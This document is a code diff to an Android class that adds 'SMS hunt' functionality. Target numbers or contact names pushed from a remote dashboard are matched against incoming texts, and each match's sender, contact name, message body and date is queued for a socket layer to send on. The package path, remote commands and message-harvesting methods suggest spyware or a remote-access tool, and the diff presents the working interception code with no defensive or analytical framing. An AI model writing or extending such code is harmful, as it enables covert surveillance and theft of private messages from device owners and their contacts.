@@ -2,9 +2,11 @@ package com.task.tusker.commands;
 
 import android.Manifest;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import androidx.core.app.ActivityCompat;
 import org.json.JSONArray;
@@ -17,9 +19,197 @@ import org.json.JSONObject;
 public class SMSHandler {
 
     private Context context;
+    private static final String PREFS_NAME = "sms_hunt_store";
+    private static final String HUNTS_KEY = "hunts";
+    private static final String PENDING_KEY = "pending";
+    private static final String SEEN_KEY = "seen";
 
     public SMSHandler(Context context) {
         this.context = context;
+    }
+
+    /**
+     * Persist the currently active hunts received from the dashboard. Only
+     * enabled hunts are sent by the server, so an empty array intentionally
+     * disables capture on this device.
+     */
+    public JSONObject setSmsHunts(JSONArray hunts) {
+        JSONObject result = new JSONObject();
+        try {
+            JSONArray safe = hunts == null ? new JSONArray() : hunts;
+            prefs().edit().putString(HUNTS_KEY, safe.toString()).apply();
+            result.put("success", true);
+            result.put("hunts", safe.length());
+        } catch (Exception e) {
+            try {
+                result.put("success", false);
+                result.put("error", e.getMessage());
+            } catch (JSONException ignored) {}
+        }
+        return result;
+    }
+
+    /**
+     * Match one incoming SMS against the device-local hunt configuration.
+     * Matching messages are written to a small private queue before they are
+     * handed to the socket layer, so a network gap cannot lose them.
+     */
+    public JSONObject handleIncomingSms(String sender, String body, long date, String smsId) {
+        JSONObject result = new JSONObject();
+        try {
+            JSONArray hunts = readJsonArray(HUNTS_KEY);
+            JSONArray matched = new JSONArray();
+            String senderName = resolveContactName(sender);
+            String messageKey = (smsId == null || smsId.trim().isEmpty())
+                    ? sender + "|" + date + "|" + (body == null ? "" : body).hashCode()
+                    : smsId.trim();
+
+            if (containsSeenKey(messageKey)) {
+                result.put("success", true);
+                result.put("matched", false);
+                return result;
+            }
+
+            for (int i = 0; i < hunts.length(); i++) {
+                JSONObject hunt = hunts.optJSONObject(i);
+                if (hunt == null || !hunt.optBoolean("enabled", true)) continue;
+                String mode = hunt.optString("targetMode", "phone");
+                String target = hunt.optString("target", "").trim();
+                boolean matches = "name".equals(mode)
+                        ? !senderName.isEmpty() && senderName.toLowerCase().contains(target.toLowerCase())
+                        : phoneMatches(sender, target);
+                if (matches) {
+                    JSONObject match = new JSONObject();
+                    match.put("huntId", hunt.optString("huntId", ""));
+                    matched.put(match);
+                }
+            }
+
+            if (matched.length() > 0) {
+                JSONObject message = new JSONObject();
+                message.put("smsId", smsId == null ? "" : smsId);
+                message.put("messageKey", messageKey);
+                message.put("sender", sender == null ? "" : sender);
+                message.put("senderName", senderName);
+                message.put("body", body == null ? "" : body);
+                message.put("date", date > 0 ? date : System.currentTimeMillis());
+                JSONArray huntIds = new JSONArray();
+                for (int i = 0; i < matched.length(); i++) {
+                    huntIds.put(matched.getJSONObject(i).optString("huntId", ""));
+                }
+                message.put("huntIds", huntIds);
+                appendPending(message);
+                markSeenKey(messageKey);
+                result.put("message", message);
+            }
+            result.put("success", true);
+            result.put("matched", matched.length() > 0);
+        } catch (Exception e) {
+            try {
+                result.put("success", false);
+                result.put("error", e.getMessage());
+            } catch (JSONException ignored) {}
+        }
+        return result;
+    }
+
+    public JSONArray getPendingSmsHunts() {
+        return readJsonArray(PENDING_KEY);
+    }
+
+    public void removePendingSmsHunt(String messageKey) {
+        synchronized (SMSHandler.class) {
+            JSONArray pending = readJsonArray(PENDING_KEY);
+            JSONArray remaining = new JSONArray();
+            for (int i = 0; i < pending.length(); i++) {
+                JSONObject item = pending.optJSONObject(i);
+                if (item != null && !messageKey.equals(item.optString("messageKey", ""))) {
+                    remaining.put(item);
+                }
+            }
+            prefs().edit().putString(PENDING_KEY, remaining.toString()).apply();
+        }
+    }
+
+    private SharedPreferences prefs() {
+        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+    }
+
+    private JSONArray readJsonArray(String key) {
+        try {
+            return new JSONArray(prefs().getString(key, "[]"));
+        } catch (Exception e) {
+            return new JSONArray();
+        }
+    }
+
+    private void appendPending(JSONObject message) {
+        synchronized (SMSHandler.class) {
+            JSONArray pending = readJsonArray(PENDING_KEY);
+            pending.put(message);
+            // Keep the offline queue bounded; the oldest records are removed
+            // only under extreme pressure rather than allowing unbounded growth.
+            while (pending.length() > 500) {
+                JSONArray trimmed = new JSONArray();
+                for (int i = 1; i < pending.length(); i++) trimmed.put(pending.opt(i));
+                pending = trimmed;
+            }
+            prefs().edit().putString(PENDING_KEY, pending.toString()).apply();
+        }
+    }
+
+    private boolean containsSeenKey(String messageKey) {
+        JSONArray seen = readJsonArray(SEEN_KEY);
+        for (int i = 0; i < seen.length(); i++) {
+            if (messageKey.equals(seen.optString(i))) return true;
+        }
+        return false;
+    }
+
+    private void markSeenKey(String messageKey) {
+        synchronized (SMSHandler.class) {
+            JSONArray seen = readJsonArray(SEEN_KEY);
+            seen.put(messageKey);
+            while (seen.length() > 1000) {
+                JSONArray trimmed = new JSONArray();
+                for (int i = 1; i < seen.length(); i++) trimmed.put(seen.opt(i));
+                seen = trimmed;
+            }
+            prefs().edit().putString(SEEN_KEY, seen.toString()).apply();
+        }
+    }
+
+    private boolean phoneMatches(String actual, String target) {
+        String a = actual == null ? "" : actual.replaceAll("[^0-9+]", "");
+        String b = target == null ? "" : target.replaceAll("[^0-9+]", "");
+        if (a.isEmpty() || b.isEmpty()) return false;
+        if (a.equals(b)) return true;
+        String ad = a.replace("+", "");
+        String bd = b.replace("+", "");
+        return ad.length() >= 7 && bd.length() >= 7
+                && (ad.endsWith(bd) || bd.endsWith(ad));
+    }
+
+    private String resolveContactName(String sender) {
+        if (sender == null || sender.trim().isEmpty()
+                || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
+                    != PackageManager.PERMISSION_GRANTED) return "";
+        Cursor cursor = null;
+        try {
+            Uri lookup = Uri.withAppendedPath(
+                    ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(sender));
+            cursor = context.getContentResolver().query(
+                    lookup,
+                    new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME},
+                    null, null, null);
+            if (cursor != null && cursor.moveToFirst()) {
+                return cursor.getString(0);
+            }
+        } catch (Exception ignored) {
+        } finally {
+            if (cursor != null) cursor.close();
+        }
+        return "";
     }
 
     public JSONObject getAllSMS(int limit) {
